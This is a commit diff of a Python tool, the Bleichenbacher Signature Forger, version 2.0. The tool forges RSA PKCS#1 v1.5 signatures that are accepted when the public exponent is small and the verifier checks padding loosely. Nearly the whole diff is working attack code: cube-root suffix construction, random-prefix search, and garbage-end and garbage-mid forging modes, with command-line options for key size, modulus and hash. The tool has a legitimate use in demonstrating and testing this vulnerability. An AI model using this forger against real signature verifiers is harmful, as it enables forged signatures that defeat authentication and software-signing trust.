bcbc626a5ff65b199bbd012f7153d34ea5d13bda
Maxim Masiutin <maxim@masiutin.com>
2021-05-05 19:16:58 +0300

    Version 2.0

--- Forge.py
+++ Forge.py
@@ -1,49 +1,195 @@
 #!/usr/bin/python
 
-import argparse
+"""
+This file is part of Bleichenbacher Signature Forger v2.0.
 
-from HashInfo import *
-from SignatureForger import *
+Copyright 2016 Filippo Valsorda
+Copyright 2017 Peter Hoeg Steffensen
+Copyright 2021 Maxim Masiutin
 
-def printOutput(signature):
-  print("****************************************************")
-  print("*         Signature successfully generated!        *")
-  print("****************************************************")
-  print("")
-  print("Signature:")
-  print(hex(signature))
-  print("Plaintext:")
-  print(hex(toInt(signature) ** 3))
+History:
+
+1.0 (July 2nd, 2017)
+  - Initial version
+
+2.0 (May 5th, 2021)
+  - Ported to Python 3. Removed strings in favor of byte objects
+  - Added support for output formats
+  - Added support for modulus and public exponent command line parameters. The modulus can be specified instead of the key size
+  - Dynamic precision adjustment for larger numbers
+  - The program exits with an appropriate message if it cannot generate a signature, rather than spinning in an endless loop
+  - The option to specify the number of FF's
+  - The "quiet" option
+  - All error messages are printed to stderr
+
+
+Bleichenbacher Signature Forger is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+Bleichenbacher Signature Forger is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with Bleichenbacher Signature Forger.  If not, see <https://www.gnu.org/licenses/>.
+"""
+
+from argparse import ArgumentParser
+from sys import stdout, stderr, argv, exit
+from HashInfo import HASH_ASN1
+from SignatureForger import SignatureForger, toInt
+from base64 import b64encode
+from binascii import hexlify
+
+DefaultPublicExponent = 3
+DefaultFFcount = 1
+DefaultQuiet = False
+
+
+def printOutput(arg_signature, arg_format, arg_quiet):
+
+    if not arg_quiet:
+        print("****************************************************")
+        print("*         Signature successfully generated!        *")
+        print("****************************************************")
+        print("")
+        print("Signature:")
+
+    binary_data = None
+    if arg_format == "base64":
+        binary_data = b64encode(arg_signature)
+    elif arg_format == "hex":
+        binary_data = hexlify(arg_signature)
+    elif arg_format == "raw":
+        stdout.buffer.write(arg_signature)
+    elif arg_format == "decimal":
+        print(toInt(arg_signature))
+    else:
+        print("Unknown output format specified " + arg_format, file=stderr)
+
+    if binary_data is not None:
+        print(binary_data.decode("ascii"))
 
 
 def getArguments():
-  parser = argparse.ArgumentParser(description="Signature forger for RSA PKCS1v1.5 given that the exponent 3 is used and the verification algorithm is not implemented properly")
+    parser = ArgumentParser(
+        description="Bleichenbacher Signature Forger. "
+        + "Version 2.0. "
+        + "This program demonstrates the vulenrability of the RSA PKCS1v1.5 and the attack when public exponent is small (e.g., 3) and the verification algorithm is not implemented properly."
+    )
 
-  parser.add_argument("-k", "--keysize", type=int)
-  parser.add_argument("-ha", "--hashalg", action="store", type=str, choices=list(HASH_ASN1.keys()))
-  parser.add_argument("-va", "--variant", type=int, choices=[1,2])
-  parser.add_argument("-of", "--outputformat", type=str, choices=["hex", "base64", "raw"])
-  parser.add_argument("-m", "--message", type=str)
+    parser.add_argument("-k", "--keysize", type=int)
+    parser.add_argument(
+        "-ha", "--hashalg", action="store", type=str, choices=list(HASH_ASN1.keys())
+    )
+    parser.add_argument(
+        "-va",
+        "--variant",
+        type=int,
+        choices=[1, 2],
+        help="1 - 00 01 FF ... 00 ASN.1 HASH ZeroGarbage;  2 - 00 01 FF RandomNonzeroGarbage 00 ASN.1 HASH",
+    )
+    parser.add_argument(
+        "-of", "--outputformat", type=str, choices=["decimal", "hex", "base64", "raw"]
+    )
+    parser.add_argument("-m", "--message", type=str)
+    parser.add_argument(
+        "-e", "--public-exponent", type=int, default=DefaultPublicExponent
+    )
+    parser.add_argument("-N", "--modulus", type=int)
+    parser.add_argument("-F", "--ffcount", type=int, default=DefaultFFcount)
+    parser.add_argument("-q", "--quiet", action="store_true")
 
-  args = parser.parse_args()
-  return args
+    ret_args = parser.parse_args()
 
-if __name__ == "__main__":
+    if len(argv) == 1:
+        parser.print_help(stderr)
+        exit(1)
 
-  args = getArguments()
+    return ret_args
 
-  keySize = args.keysize
-  hashAlg = args.hashalg
 
-  signatureForger = SignatureForger(keySize, hashAlg)
+args = getArguments()
 
-  signature = ""
+quiet = args.quiet
 
-  if args.variant == 1:
-    signature = signatureForger.forgeSignature_method1(args.message)
-  elif args.variant == 2:
-    signature = signatureForger.forgeSignature_method2(args.message)
-  else:
-    raise Exception("Unsupported signature method") 
+if quiet is None:
+    quiet = DefaultQuiet
 
-  printOutput(signature)
+keySize = args.keysize
+hashAlg = args.hashalg
+ffcount = args.ffcount
+if ffcount is None:
+    ffcount = DefaultFFcount
+
+public_exponent = args.public_exponent
+if public_exponent is None:
+    public_exponent = DefaultPublicExponent
+
+modulus = args.modulus
+
+if (modulus is not None) and (keySize is not None):
+    modulus_bits = modulus.bit_length()
+    if modulus_bits > keySize:
+        print(
+            "You have specified modulus of",
+            modulus_bits,
+            "bits and the key size of",
+            keySize,
+            "bits which is smaller!",
+            file=stderr,
+        )
+        exit(1)
+
+    dif = keySize - modulus_bits
+    if dif > 16:
+        print(
+            "You have specified modulus of",
+            modulus_bits,
+            "bits and the key size of",
+            keySize,
+            "bits. Therefore, the modulus is",
+            dif,
+            "bits smaller than the key size, while the maximum tolerable difference is 16 bits",
+            file=stderr,
+        )
+        exit(1)
+
+if (modulus is not None) and (keySize is None):
+    keySize = modulus.bit_length()
+
+if public_exponent is None:
+    public_exponent = DefaultPublicExponent
+
+if keySize is None:
+    print("Please specify the key size and/or the modulus", file=stderr)
+    exit(1)
+
+signatureForger = SignatureForger(
+    keySize, hashAlg, modulus, public_exponent, ffcount, quiet
+)
+
+signature = None
+
+if args.variant == 1:
+    signature = signatureForger.forgeSignature_method_garbage_end(args.message)
+elif args.variant == 2:
+    signature = signatureForger.forgeSignature_method_garbage_mid(args.message)
+else:
+    print("Unsupported signature method", file=stderr)
+    exit(1)
+
+of = args.outputformat
+if of is None:
+    of = "base64"
+if signature is None:
+    print("Cannot generate the signature.", end="", file=stderr)
+    if (public_exponent <= 3) and (keySize < 4096):
+        print(" (Key size is too small?)", end="", file=stderr)
+    print("", file=stderr)
+    exit(2)
+else:
+    printOutput(signature, of, quiet)
--- SignatureForger.py
+++ SignatureForger.py
@@ -1,100 +1,166 @@
 #!/usr/bin/python
 
-import binascii
-import hashlib
-import gmpy2
-import os
+"""
+This file is part of Bleichenbacher Signature Forger v2.0.
 
-from HashInfo import *
+Copyright 2016 Filippo Valsorda
+Copyright 2017 Peter Hoeg Steffensen
+Copyright 2021 Maxim Masiutin
 
-from decimal import Decimal, getcontext
+Bleichenbacher Signature Forger is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
 
-keysize = 1024
+Bleichenbacher Signature Forger is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with Bleichenbacher Signature Forger.  If not, see <https://www.gnu.org/licenses/>.
+"""
+
+from sys import stderr, exit
+from os import urandom
+from gmpy2 import get_max_precision, get_context, cbrt, root
+from HashInfo import Hash
+
 
 def getBitAt(idx, val):
-  return (val >> idx) & 0x01
+    return (val >> idx) & 0x01
+
 
 def setBitAt(idx, val):
-  return val | (0x01 << idx)
+    return val | (0x01 << idx)
+
 
 def toInt(val):
-  return int(val.encode("hex"), 16)
+    return int.from_bytes(val, byteorder="big")
 
-def toBytes(val):
-  hexVal = hex(val)[2:-1]
-  if len(hexVal) % 2 == 1:
-    hexVal = "0"+hexVal
-  return hexVal.decode("hex")
+
+def toBytes(val, arg_len):
+    return int.to_bytes(val, length=arg_len, byteorder="big")
+
 
 class SignatureForger:
+    def __init__(self, keysize, hashAlg, modulus, public_exponent, ffcount, quiet):
+        self.keysize_bytes = (keysize + 7) // 8
+        self.keysize_bits = keysize
+        self.hashAlg = Hash(hashAlg)
+        self.modulus = modulus
+        self.public_exponent = public_exponent
+        self.max_precision = None
+        self.ffcount = ffcount
+        self.quiet = quiet
 
-  def __init__(self, keysize, hashAlg):
-    self.keysize = keysize
-    self.hashAlg = Hash(hashAlg)
+    def limit_precision(self, aprecision):
+        if self.max_precision is None:
+            self.max_precision = get_max_precision() - 16
+        return min(
+            min(aprecision, self.keysize_bits * 128 * self.public_exponent),
+            self.max_precision,
+        )
 
-  def encodePkcs1Suffix(self, message):
-    messageHash = self.hashAlg.digester(message).digest()
-    if ord(messageHash[-1]) & 0x01 != 0x01:
-      print("Hash value must be uneven. Try a different message")
-      exit()
-    suffix = "\x00" + self.hashAlg.digestInfo + messageHash
-    return suffix
-  
-  def constructSignatureSuffix(self, suffix):
-    signatureSuffix = 1
-    for idx in range(len(suffix) * 8):
-      if getBitAt(idx, signatureSuffix ** 3) != getBitAt(idx, toInt(suffix)):
-        signatureSuffix = setBitAt(idx, signatureSuffix)
-    return toBytes(signatureSuffix)
+    def encodePkcs1Suffix(self, message):
+        messageHash = self.hashAlg.digester(message.encode("utf-8")).digest()
+        if messageHash[-1] & 0x01 != 0x01:
+            print("Hash value must be uneven. Try a different message", file=stderr)
+            exit(1)
+        suffix = bytes([0]) + self.hashAlg.digestInfo + messageHash
+        return suffix
 
-  def addPrefixToSignature(self, signatureSuffix):
-    prefix = "\x00\x01"
-    prefix += "\xFF"*8
-    while True:
-      testPrefix = prefix + os.urandom((self.keysize/8) - (len(prefix)))
-      signatureCandidate = toBytes(int(gmpy2.cbrt(toInt(testPrefix))))[:-len(signatureSuffix)] + signatureSuffix
-      toCheck = toBytes(toInt(signatureCandidate) ** 3)
-      if "\x00" not in toCheck[:-len(signatureSuffix)]:
-        return signatureCandidate
+    def constructSignatureSuffix(self, suffix):
+        signatureSuffix = 1
+        for idx in range(len(suffix) * 8):
+            if self.modulus is not None:
+                modexp = pow(signatureSuffix, self.public_exponent, self.modulus)
+            else:
+                modexp = pow(signatureSuffix, self.public_exponent)
+            if getBitAt(idx, modexp) != getBitAt(idx, toInt(suffix)):
+                signatureSuffix = setBitAt(idx, signatureSuffix)
+        return toBytes(signatureSuffix, (signatureSuffix.bit_length() + 7) // 8)
 
+    def addPrefixToSignature(self, signatureSuffix):
+        progress = False
+        precision = (self.keysize_bits + 7) // 16
+        attempts = 0
+        prefix = bytes([0x00, 0x01])
+        prefix = prefix + ((bytes([0xFF])) * self.ffcount)
+        while True:
+            get_context().precision = self.limit_precision(precision)
+            attempts += 1
+            testPrefix = prefix + urandom(self.keysize_bytes - len(prefix))
+            signatureCandidate = (
+                toBytes(int(cbrt(toInt(testPrefix))), self.keysize_bytes)[
+                    : -len(signatureSuffix)
+                ]
+                + signatureSuffix
+            )
+            sc = toInt(signatureCandidate)
+            if self.modulus is not None:
+                modexp = pow(sc, self.public_exponent, self.modulus)
+            else:
+                modexp = pow(sc, self.public_exponent)
+            toCheck = toBytes(modexp, (modexp.bit_length() + 7) // 8)
+            if 0 not in toCheck[: -len(signatureSuffix)]:
+                if progress:
+                    if not self.quiet:
+                        print("")
+                if attempts > 1:
+                    if not self.quiet:
+                        print("Found in", attempts, "attempt(s)")
+                return signatureCandidate
+            precision = precision + ((precision + 3) // 4)
+            if attempts == 10:
+                progress = True
+                if not self.quiet:
+                    print("Generating the signature", end="", flush=True)
+            if attempts > 10:
+                if not self.quiet:
+                    print(".", end="", flush=True)
+            if attempts > 100 * self.public_exponent:
+                if progress:
+                    if not self.quiet:
+                        print("")
+                return None
 
-  def forgeSignature_method1(self, message):
-    suffix = self.encodePkcs1Suffix(message)
-    signatureSuffix = self.constructSignatureSuffix(suffix)
-    signature = self.addPrefixToSignature(signatureSuffix)
-    return signature
+    def forgeSignature_method_garbage_mid(self, message):
+        suffix = self.encodePkcs1Suffix(message)
+        signatureSuffix = self.constructSignatureSuffix(suffix)
+        signature = self.addPrefixToSignature(signatureSuffix)
+        return signature
 
-  def nthroot (self, n, A, precision=300):
-    getcontext().prec = precision
-   
-    n = Decimal(n)
-    x_0 = A / n #step 1: make a while guess.
-    x_1 = 1     #need it to exist before step 2
-    while True:
-      #step 2:
-      x_0, x_1 = x_1, (1 / n)*((n - 1)*x_0 + (A / (x_0 ** (n - 1))))
-      if x_0 == x_1:
-        return x_1
+    def nthroot(self, e, A, prec):
+        get_context().precision = prec
+        tu = root(A, e)
+        return int(tu)
 
-  def forgeSignature_method2(self, message, psLength=8):
-    prefix = "\x00\x01"
-    prefix += "\xFF"*psLength
-    suffix = self.encodePkcs1Suffix(message)
-    plain = prefix + suffix + "\x00"*((self.keysize/8)-(len(prefix) + len(suffix)))
-    signature = toBytes(int(self.nthroot(3, toInt(plain)))+1)
-    return signature
+    def forgeSignature_method_garbage_end(self, message):
+        attempts = 0
+        prefix = bytes([0x00, 0x01])
+        prefix = prefix + ((bytes([0xFF])) * self.ffcount)
+        suffix = self.encodePkcs1Suffix(message)
+        value = prefix + suffix
+        numzeros = self.keysize_bytes - len(value)
+        plain = value + (bytes([0]) * numzeros)
+        plain_int = toInt(plain)
+        precision = len(value) * 8
+        while True:
+            attempts += 1
+            signature = self.nthroot(
+                self.public_exponent, plain_int, self.limit_precision(precision)
+            )
+            if self.modulus is not None:
+                plain2 = pow(signature, self.public_exponent, self.modulus)
+            else:
+                plain2 = pow(signature, self.public_exponent)
+            plain2_bytes = toBytes(plain2, self.keysize_bytes)
+            if plain2_bytes[: len(value)] == value:
+                break
+            precision = precision * 2
+            if attempts > 4:
+                return None
 
-if __name__ == "__main__":
-  message = "WhAAASDAatWhatInTheButt"
-  signatureForger = SignatureForger(1024, "SHA-1", 1)
-  #signature = signatureForger.forgeSignature_method1(message)
-  signature = signatureForger.forgeSignature_method2(message)
-  print(hex(toInt(signature) ** 3))
-  
-'''
-output format: raw, hex, base64
-keysize: raw, from public key
-hash algo, md5, sha1, sha256, sha384, sha512
-message to sign: ascii, hex, base64
-'''
-
+        signature_bytes = (signature.bit_length() + 7) // 8
+        return toBytes(signature, signature_bytes)
